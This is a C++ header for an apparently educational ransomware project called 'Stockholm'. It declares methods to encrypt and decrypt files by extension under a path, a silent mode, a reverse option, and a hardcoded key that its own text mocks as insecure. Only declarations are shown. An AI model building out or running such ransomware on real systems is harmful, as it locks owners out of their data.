/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Stockholm.class.hpp                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: bguyot <bguyot@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/05/19 09:43:26 by bguyot            #+#    #+#             */
/*   Updated: 2023/05/19 15:04:56 by bguyot           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

class Stockholm;
#pragma once

#include <string>
#include <iostream>
#include <filesystem>
#include <vector>
#include <algorithm>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include "constants.hpp"

class Stockholm
{
private:
	bool _help;
	bool _version;
	bool _silent;
	bool _reverse;
	std::string _key = "oursupersecureencryptionkeybakedwithloveandchocolaterlynobodycouldeverbreakthiswdymthisisntsecureatallandwecanjuststringsthebinary?";
	const std::filesystem::path _path;
	const std::vector<std::string> _extensions{RANSOMWARE_EXTENSIONS};

	void _printHelp(void);
	void _printVersion(void);
	void _decipher(std::filesystem::path path);
	void _decipherFile(std::filesystem::path path);
	void _cipher(std::filesystem::path path);
	void _cipherFile(std::filesystem::path path);

public:
	Stockholm(void);
	~Stockholm(void);

	void setHelp(bool help);
	void setVersion(bool version);
	void setSilent(bool silent);
	void setReverse(bool reverse);
	void setKey(std::string key);
	void run(void);
};